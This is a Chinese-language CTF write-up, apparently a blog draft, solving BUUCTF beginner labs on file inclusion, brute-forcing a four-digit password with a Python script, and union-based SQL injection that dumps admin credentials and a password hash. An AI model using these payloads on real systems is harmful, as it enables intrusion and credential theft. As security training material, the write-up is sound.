---
layout: post
title: BUUCTF Basic WriteUp
date: 2025-11-05 19:45:05 +0800
category: 技术向
tags: [CTF]
image: https://s1.bpoj.top/bd5cccc33cf551489c230fb685e260cc.png
locale: zh_CN
math: true
published: false
---

## BUU LFI COURSE 1

看到 php 代码：

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:07 AM
 */

highlight_file(__FILE__);

if(isset($_GET['file'])) {
    $str = $_GET['file'];

    include $_GET['file'];
}
```

阅读代码，发现可以 get 方法传参 file=/flag，拿到 flag：`flag{97452034-df28-4d12-b052-de74f0e1e7c0}`。

## BUU BRUTE 1

```html
<form method="get">
    <p>Username: <input type="text" name="username" /></p>
    <p>Password: <input type="password" name="password" /></p>
    <input type="submit" value="Submit" />
</form>
```

试了几个常见的 username，发现填 admin 提示密码错误，为四位数字。

考虑暴力破解：

```py
import requests 
url = "http://0ce8ea49-e387-4fae-bc71-affb67b1d123.node5.buuoj.cn:81/?username=admin&password="
for i in range(1000, 100000):
    res = requests.get(url + str(i))
    print(i, res.text)
    if res.text != "密码错误，为四位数字。" :
        print(res.text)
        break

# 6490 登录成功。flag{db41099c-5c20-4401-81f3-17a06d66b6e8}
```

密码为 `6490`，flag 为 `flag{db41099c-5c20-4401-81f3-17a06d66b6e8}`。

## BUU SQL COURSE 1

![page](https://s1.bpoj.top/39a2aa5e5066c2cfd27775c6a1bf229d.png)

先找注入点，点击测试新闻 1，发现如下请求：

`http://c40fdb45-77a2-4897-a68f-9460b4363ab3.node5.buuoj.cn:81/backend/content_detail.php?id=1`

发现有传参，尝试注入。输入 `/id?1 and 1=1`，返回：

```
{
  "title": "测试新闻1",
  "content": "哈哈哈哈"
}
```

页面正常回显信息，说明有 sql 注入点。

先判一下数据库列数，例如：

```
?id=1 order by 1
?id=1 order by 1,2
?id=1 order by 1,2,3
```

发现试到 3 就不返回数据了，说明数据库一共有 2 列。

然后查表，使用 payload：`?id=-1 union select 1,database()`，返回信息：

```
{
  "title": "1",
  "content": "news"
}
```

说明数据库名字叫 `news`，继续查看表名：

```
?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='news'

response:
{
  "title": "1",
  "content": "admin,contents"
}
```

说明有 `admin` 和 `contents` 两个表，我们需要查 `admin` 表的信息。

继续查 `admin` 表的字段名:

```
?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='admin'

response:
{
  "title": "1",
  "content": "id,username,password"
}
```

我们需要 `username` 和 `password` 这两个字段：

```
?id=-1 union select 1,group_concat(username) from admin 

response:
{
  "title": "1",
  "content": "admin"
}

?id=-1 union select 1,group_concat(password) from admin 

response:
{
  "title": "1",
  "content": "5b2a3161066e5de3fcebd287130d3e57"
}
```

拿到账号密码分别为 `admin` 和 `5b2a3161066e5de3fcebd287130d3e57`，我们尝试登录，拿到 flag：`flag{45b7bcda-a8d2-4a20-80c0-a90417235497}`。

![flag](https://s1.bpoj.top/e6ad482c359720c9ad96ad03e36403e0.png)

## Upload-Labs-Linux

[见此](/posts/upload-labs-linux)。

